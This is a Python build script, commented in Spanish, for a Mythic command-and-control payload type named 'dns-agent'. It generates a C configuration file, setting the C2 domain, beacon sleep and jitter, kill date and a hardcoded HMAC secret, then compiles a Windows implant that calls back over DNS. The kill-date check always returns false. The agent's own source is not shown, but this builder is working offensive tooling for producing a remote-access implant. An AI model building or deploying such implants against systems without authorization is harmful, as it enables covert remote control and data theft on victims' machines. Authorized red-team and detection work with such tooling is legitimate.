# build.py  (code-first, estilo B, con soporte HMAC y debug)
from mythic_container.PayloadBuilder import (
    PayloadType,
    BuildResponse,
    BuildStatus,
    BuildParameter,
    BuildParameterType
)
from mythic_container.MythicCommandBase import SupportedOS
from pathlib import Path
import subprocess
import os

class DNSAgent(PayloadType):
    name            = "dns-agent"
    file_extension  = "exe"
    author          = "Ruben"
    description     = "DNS C2 Agent for Mythic (Windows) con HMAC y debug"
    supported_os    = [SupportedOS.Windows]
    c2_profiles     = ["dns"]

    # Ambos paths apuntan a tu código y headers
    agent_path      = Path("agent_code")
    agent_code_path = Path("agent_code")

    build_parameters = [
        BuildParameter(
            name="c2_domain",
            parameter_type=BuildParameterType.String,
            description="C2 Domain o IP para DNS",
            default_value="c2.example.com"
        ),
        BuildParameter(
            name="sleep_interval",
            parameter_type=BuildParameterType.Number,
            description="Sleep interval (seconds)",
            default_value=15
        ),
        BuildParameter(
            name="jitter_percentage",
            parameter_type=BuildParameterType.Number,
            description="Jitter percentage",
            default_value=10
        ),
        BuildParameter(
            name="msginit",
            parameter_type=BuildParameterType.String,
            description="Subdomain prefix (msginit)",
            default_value="app"
        ),
        BuildParameter(
            name="msgdefault",
            parameter_type=BuildParameterType.String,
            description="Default message type (msgdefault)",
            default_value="dash"
        ),
        BuildParameter(
            name="hmac_key",
            parameter_type=BuildParameterType.String,
            description="HMAC shared secret (must match dns_profile.json)",
            default_value="13a6868413d6f20d9ae58dcbb82f136b506c85964dab3c2f303764c6b1f89318"
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Compile with DEBUG_MODE=1",
            default_value=True
        )
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)
        try:
            # 1) Leer parámetros
            c2         = self.get_parameter("c2_domain")       or "c2.example.com"
            sleep      = int(self.get_parameter("sleep_interval")   or 30)
            jitter     = int(self.get_parameter("jitter_percentage")or 10)
            msginit    = self.get_parameter("msginit")         or "app"
            msgdefault = self.get_parameter("msgdefault")      or "dash"
            hmac_key   = self.get_parameter("hmac_key")        or ""
            debug      = bool(self.get_parameter("debug"))

            uuid       = self.uuid

            # 2) Rutas de código
            repo     = Path.cwd()
            code_dir = repo / self.agent_code_path
            src_dir  = code_dir / "source"
            cfg_file = src_dir / "Config.c"

            # 3) Generar Config.c con HMAC, debug y UUID
            cfg_file.write_text(f'''#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "../include/Config.h"

#define DEBUG_MODE {1 if debug else 0}
{ "#define USE_HMAC" if hmac_key else "" }

// Parámetros por defecto
static char*        c2_domain        = NULL;
static const char*  agent_id         = "{uuid}";
static DWORD        sleep_interval   = {sleep} * 1000;
static DWORD        jitter_percentage= {jitter};
static DWORD        kill_date        = 0;
// DNS específicos
static char*        msginit          = NULL;
static char*        msgdefault       = NULL;
{ f'static const char*  hmac_key         = "{hmac_key}";' if hmac_key else "" }

void reset_config(void) {{
#if DEBUG_MODE
    printf("[CFG] reset_config()\\n");
#endif
    if(c2_domain) free(c2_domain);
    c2_domain = _strdup("{c2}");
#if DEBUG_MODE
    printf("[CFG] c2_domain = %s\\n", c2_domain);
#endif
    sleep_interval    = {sleep} * 1000;
    jitter_percentage = {jitter};
#if DEBUG_MODE
    printf("[CFG] sleep_interval=%lu jitter_percentage=%lu\\n", sleep_interval, jitter_percentage);
#endif
    kill_date = 0;
#if DEBUG_MODE
    printf("[CFG] kill_date = %u\\n", kill_date);
#endif
    if(msginit) free(msginit);
    msginit    = _strdup("{msginit}");
#if DEBUG_MODE
    printf("[CFG] msginit = %s\\n", msginit);
#endif
    if(msgdefault) free(msgdefault);
    msgdefault = _strdup("{msgdefault}");
#if DEBUG_MODE
    printf("[CFG] msgdefault = %s\\n", msgdefault);
#endif
}}

const char* get_c2_domain(void)    {{ return c2_domain; }}
void set_c2_domain(const char* d)  {{ if(c2_domain) free(c2_domain); c2_domain = _strdup(d); }}
const char* get_agent_id(void)     {{ return agent_id; }}
DWORD get_sleep_interval(void)     {{ return sleep_interval; }}
void set_sleep_interval(DWORD i)   {{ sleep_interval = i; }}
DWORD get_jitter_percentage(void)  {{ return jitter_percentage; }}
void set_jitter_percentage(DWORD j){{ jitter_percentage = j; }}
const char* get_msginit(void)      {{ return msginit; }}
void set_msginit(const char* p)    {{ if(msginit) free(msginit); msginit = _strdup(p); }}
const char* get_msgdefault(void)   {{ return msgdefault; }}
void set_msgdefault(const char* t) {{ if(msgdefault) free(msgdefault); msgdefault = _strdup(t); }}
DWORD get_kill_date(void)          {{ return kill_date; }}
BOOL is_kill_date_passed(void)     {{ return FALSE; }}
{ 'const char* get_hmac_key(void)     { return hmac_key; }' if hmac_key else '' }
''', encoding="utf-8")

            # 4) Compilar usando Makefile
            env = os.environ.copy()
            cflags = "-Wall -Wextra -Iinclude"
            if debug:
                cflags += " -g -O0 -DDEBUG_MODE=1"
            if hmac_key:
                cflags += " -DUSE_HMAC"
            ldflags = "-lws2_32 -liphlpapi -ldnsapi -lshlwapi -lole32 -lrpcrt4 -luuid -lbcrypt"
            env["CFLAGS"]  = cflags
            env["LDFLAGS"] = ldflags

            subprocess.check_call(["make", "clean"], cwd=str(code_dir), env=env)
            subprocess.check_call(["make"],       cwd=str(code_dir), env=env)

            # 5) Adjuntar el binario resultante
            exe = code_dir / "bin" / "mythic_dns_agent.exe"
            if not exe.is_file():
                resp.build_stderr = "Binary not found after make"
                return resp

            resp.payload       = exe.read_bytes()
            resp.status        = BuildStatus.Success
            resp.build_message = f"Build succeeded{' (debug)' if debug else ''}"
            return resp

        except subprocess.CalledProcessError as e:
            resp.build_stderr = f"Make failed: {e}"
            return resp
        except Exception as e:
            resp.build_stderr = f"Unexpected error: {e}"
            return resp
